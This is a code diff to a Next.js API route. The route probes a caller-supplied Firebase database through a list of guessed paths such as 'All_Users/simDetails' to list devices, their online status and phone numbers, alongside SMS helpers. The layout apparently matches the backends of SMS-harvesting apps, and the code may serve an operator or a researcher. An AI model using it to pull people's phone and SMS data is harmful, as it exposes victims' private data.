@@ -1,5 +1,5 @@
 import { NextResponse } from "next/server";
-import { fbGet, cleanBase, normalizeDevices, normalizeSms, smsPaths } from "@/lib/firebase";
+import { fbGet, cleanBase, normalizeDevices, normalizeSms, smsPaths, extractPhone } from "@/lib/firebase";
 
 export const dynamic = "force-dynamic";
 
@@ -19,19 +19,47 @@ export async function POST(req) {
     }
 
     if (action === "devices") {
-      // try common roots
-      const roots = ["clients", "user_data", "All_Users/DeviceInfo", "registeredDevices"];
+      const roots = [
+        "clients",
+        "user_data",
+        "All_Users/DeviceInfo",
+        "All_Users/simDetails",
+        "registeredDevices",
+        "devices",
+        "user_list",
+      ];
       let devices = [];
       let used = null;
+
       for (const root of roots) {
         const r = await fbGet(base, root, auth);
         if (r.ok && r.data && typeof r.data === "object") {
-          devices = normalizeDevices(r.data);
-          used = root;
-          if (devices.length) break;
+          const list = normalizeDevices(r.data);
+          if (list.length > devices.length) {
+            devices = list;
+            used = root;
+          }
+          if (list.some((d) => d.phone)) {
+            devices = list;
+            used = root;
+            break;
+          }
         }
       }
-      // fallback shallow root scan not expanded for speed
+
+      // merge phones from simDetails if present
+      const sim = await fbGet(base, "All_Users/simDetails", auth);
+      if (sim.ok && sim.data && typeof sim.data === "object") {
+        const map = {};
+        for (const [id, val] of Object.entries(sim.data)) {
+          const p = extractPhone(val);
+          if (p) map[id] = p;
+        }
+        if (Object.keys(map).length) {
+          devices = devices.map((d) => ({ ...d, phone: d.phone || map[d.id] || "" }));
+        }
+      }
+
       const online = devices.filter((d) => d.online).length;
       return NextResponse.json({
         ok: true,
@@ -39,6 +67,7 @@ export async function POST(req) {
         total: devices.length,
         online,
         offline: devices.length - online,
+        withPhone: devices.filter((d) => d.phone).length,
         devices,
       });
     }
